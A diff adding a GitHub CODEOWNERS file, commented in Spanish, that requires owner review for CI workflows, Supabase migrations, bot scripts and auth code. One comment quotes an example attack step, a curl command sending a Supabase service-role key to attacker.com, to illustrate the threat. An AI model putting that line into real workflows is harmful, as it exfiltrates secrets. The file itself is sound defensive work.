@@ -1,0 +1,28 @@
+# CODEOWNERS
+# https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners
+#
+# Cualquier PR que toque archivos listados acá requiere review del owner
+# antes de merge — defensa contra workflow-edit attack (un atacante que
+# logra commit access agrega un step `curl attacker.com -d "$SUPABASE_SERVICE_ROLE_KEY"`).
+#
+# IMPORTANTE: para que CODEOWNERS surta efecto, tenés que activar en GitHub:
+#   Repo → Settings → Branches → Branch protection rule en `main`
+#     → ✓ Require a pull request before merging
+#     → ✓ Require review from Code Owners
+#     → ✓ Require approvals (≥1)
+#   Sin esos toggles, el archivo es solo documentación.
+
+# Workflows + secretos de CI: cualquier cambio requiere review explícita.
+/.github/                @manuelsg17
+/.github/workflows/      @manuelsg17
+
+# Migraciones SQL: cambios de schema/RLS afectan blast radius.
+/supabase/               @manuelsg17
+
+# Scripts del bot: tocan service_role + DB upstream.
+/scripts/bot-sync/       @manuelsg17
+
+# Auth y access control: hardening crítico.
+/src/lib/auth.js         @manuelsg17
+/src/lib/supabase.js     @manuelsg17
+/src/hooks/useAccessControl.js @manuelsg17
